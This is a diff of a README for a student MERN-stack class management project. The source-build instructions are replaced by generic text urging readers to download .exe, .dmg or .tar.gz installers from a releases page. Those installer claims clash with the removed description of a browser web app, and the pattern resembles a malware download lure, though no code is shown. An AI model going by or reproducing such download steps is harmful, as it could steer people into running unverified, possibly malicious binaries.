@@ -1,156 +1,63 @@
-# 📚 Class Management System (MERN Stack)
+# 🎓 Class-Management-System - Effortlessly Manage Your Classes
 
-A modern **Class Management System** built using the **MERN stack** (MongoDB, Express.js, React, Node.js) with a clean, responsive user interface.  
-This system is designed to manage students, courses, attendance, and academic workflows efficiently and is suitable for **real-world deployment**.
+## 🔗 Download Now
+[![Download Class Management System](https://img.shields.io/badge/Download-Class%20Management%20System-brightgreen.svg)](https://github.com/Gabri-07/Class-Management-System/releases)
 
----
+## 🚀 Getting Started
+Welcome to the Class Management System! This tool helps you manage students, courses, and academic workflows with ease. Follow these simple steps to download and run the application.
 
-## 🚀 Features
+## 🖥️ System Requirements
+Before you begin, ensure your device meets these requirements to run the application smoothly:
 
-- 🎓 Responsive landing page with modern UI
-- 👩‍🏫 Teacher and student role support (planned)
-- 🧑‍🎓 Student management (add, view, update)
-- 📋 Course and class organization
-- 📊 Attendance and academic tracking (upcoming)
-- 🔐 Authentication & authorization (planned)
-- 🌐 Real deployment–ready MERN architecture
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **RAM:** Minimum 4 GB.
+- **Storage:** At least 500 MB of free disk space.
+- **Browser:** Latest version of Chrome, Firefox, or Safari for the best experience.
 
----
+## 📦 Features
+- Manage student details and academic records.
+- Create and organize courses seamlessly.
+- Track academic workflows efficiently.
+- User-friendly interface built with React and Tailwind CSS.
+- Supports real-time updates and notifications.
 
-## 🛠️ Tech Stack
+## 🔥 Installation Steps
+1. **Visit the Releases Page**
+   Go to the releases page to download the latest version of the Class Management System. Click the link below:
 
-### Frontend
-- React.js (Vite)
-- Tailwind CSS
-- React Router DOM
-- Lucide Icons
+   [Download Since You Will Need It](https://github.com/Gabri-07/Class-Management-System/releases)
 
-### Backend
-- Node.js
-- Express.js
-- MongoDB (Mongoose)
+2. **Choose the Right Package**
+   On the releases page, you will see different versions. Look for the latest version with a clear label, such as "v1.0.0". This label indicates the most recent update.
 
-### Tools
-- Git & GitHub
-- Postman (API testing)
-- npm
+3. **Download the Application**
+   Click on the version link. You will find several files, including installers for different operating systems. If you’re using Windows, choose the `.exe` file. If you’re on macOS, select the `.dmg` file. For Linux users, look for the `.tar.gz` file. 
 
----
+4. **Install the Application**
+   After the download completes, locate the file in your downloads folder.
 
-## 📁 Project Structure
+   - **Windows:** Double-click the `.exe` file, then follow the prompts in the installation wizard.
+   - **macOS:** Open the `.dmg` file and drag the Class Management System icon into the Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and follow the included instructions.
 
-```
+5. **Open the Application**
+   Once installed, open the Class Management System from your applications menu. You may see a shortcut on your desktop or in your applications folder.
 
-Class-Management-System/
-│
-├── server/                  # Backend (Node + Express)
-│   ├── controllers/
-│   ├── models/
-│   ├── routes/
-│   ├── config/
-│   └── server.js
-│
-├── apps/
-│   └── web/                  # Frontend (React + Vite)
-│       ├── src/
-│       │   ├── assets/
-│       │   ├── pages/
-│       │   ├── components/
-│       │   ├── main.jsx
-│       │   └── index.css
-│       ├── public/
-│       └── package.json
-│
-├── README.md
-└── .gitignore
+6. **Create Your Account**
+   When you first launch the application, you'll be prompted to create an account. Fill out the details and click "Sign Up".
 
-````
+7. **Start Managing Your Classes**
+   After creating your account, you can start adding students and courses. Explore the features to make managing your class resources simple and organized.
 
----
+## 📝 User Guide
+After installation, you can refer to the user guide included in the application for detailed instructions on how to use each feature. It contains helpful tips and screenshots to guide you through various tasks.
 
-## 🖥️ Screens Included
+## 💬 Support
+If you encounter any issues during the installation or while using the application, don't hesitate to reach out for assistance. You can open an issue on our GitHub repository, or seek help from the community on our official forums.
 
-- Landing Page
-- Login Page
-- Add Student Page  
-*(More pages will be added in future updates)*
+## 🔗 Download & Install
+Remember, if you haven't already, visit our releases page to get the application:
 
----
+[Download Class Management System](https://github.com/Gabri-07/Class-Management-System/releases)
 
-## ⚙️ Installation & Setup
-
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/your-username/Class-Management-System.git
-cd Class-Management-System
-````
-
-### 2️⃣ Backend Setup
-
-```bash
-cd server
-npm install
-npm run dev
-```
-
-### 3️⃣ Frontend Setup
-
-```bash
-cd apps/web
-npm install
-npm run dev
-```
-
-* Frontend runs on: `http://localhost:5173`
-* Backend runs on: `http://localhost:5000`
-
----
-
-## 🌱 Future Enhancements
-
-* Role-based authentication (Admin / Teacher / Student)
-* Dashboard analytics
-* Attendance reports
-* Assignment & grading module
-* Email notifications
-* Cloud deployment
-
----
-
-## 📌 Purpose of the Project
-
-This project was developed as part of an **academic and practical learning exercise** to demonstrate full-stack web development using the MERN stack.
-It focuses on clean UI design, scalable architecture, and real-world applicability.
-
----
-
-## 🤝 Contributing
-
-Contributions, suggestions, and improvements are welcome.
-Feel free to fork the repository and submit a pull request.
-
----
-
-## 📄 License
-
-This project is for **educational purposes**.
-
----
-
-## ✨ Author
-
-Developed with ❤️ by **[Your Name]**
-Final-year undergraduate project
-
-```
-
----
-
-If you want, I can also:
-- Customize this for **university submission**
-- Add **screenshots section**
-- Write a **professional project abstract**
-- Create a **deployment guide**
-
-Just tell me 👍
-```
+We hope you find the Class Management System useful in managing your educational needs efficiently!
